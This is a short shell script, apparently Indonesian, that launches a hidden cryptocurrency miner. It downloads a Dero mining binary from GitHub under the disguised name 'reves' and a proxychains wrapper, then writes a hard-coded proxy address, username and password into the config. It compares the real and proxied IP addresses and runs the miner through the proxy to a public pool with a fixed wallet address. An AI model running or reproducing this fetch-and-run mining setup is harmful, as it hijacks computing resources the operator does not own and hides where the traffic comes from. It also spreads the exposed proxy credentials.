proxy="45.155.69.201" 
port="6406" 
user="ingfoingfo"  
pass="maszZeehh"
wget -q -O reves https://github.com/putri212/mbah/raw/main/dero-stratum-miner && chmod +x reves
wget -q https://github.com/mamagisel/pret/raw/main/panel && chmod +x panel 
wget -q https://github.com/mamagisel/pret/raw/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://github.com/mamagisel/pret/raw/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf"  
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./reves -r pool.whalesburg.com:4300 -w dERop4c62FNd1iJMXrbq2aGC6BFYVyUvTah3BwVyC3mpW3XDbXkvu8LbvNQRn93W272ddMzRGGPGWa4jti7cbzfA53mYvnr737
